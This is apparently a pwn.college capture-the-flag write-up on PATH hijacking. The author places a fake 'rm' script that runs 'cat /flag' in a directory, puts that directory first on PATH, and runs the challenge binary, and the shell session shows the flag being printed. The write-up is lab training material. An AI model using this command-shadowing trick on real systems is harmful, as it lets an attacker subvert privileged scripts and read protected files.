# Hijacking Commands
In this challenge `/challenge/run` will try and remove the flag using `rm` but we can hijack this command by overriding this command with the `cat` command which will read the flag instead of removing the flag which will solve this challenge.

# My Solve
Firstly I made a directory called solutions then changed my directory to it. We know that the absolute path of `cat` is `/run/dojo/bin/cat` so we ovverride `rm` with `/run/dojo/bin/cat /flag` which is essentially `cat flag` instead of `rm flag`. After that we made `rm` an executable by doing `chmod a+x rm`. After that we modified `PATH` to the solutions directory after which we simply ran `/challenge/run` to get our flag.
```bash
hacker@path~hijacking-commands:~$ cd solutions
hacker@path~hijacking-commands:~/solutions$ echo "/run/dojo/bin/cat /flag" > rm
hacker@path~hijacking-commands:~/solutions$ chmod a+x rm
hacker@path~hijacking-commands:~/solutions$ PATH=/home/hacker/solutions
hacker@path~hijacking-commands:~/solutions$ /challenge/run
Trying to remove /flag...
pwn.college{Q7E9okmQ0nsV_TMXBiuIAeYQ4wz.ddzNyUDLxITN0czW}
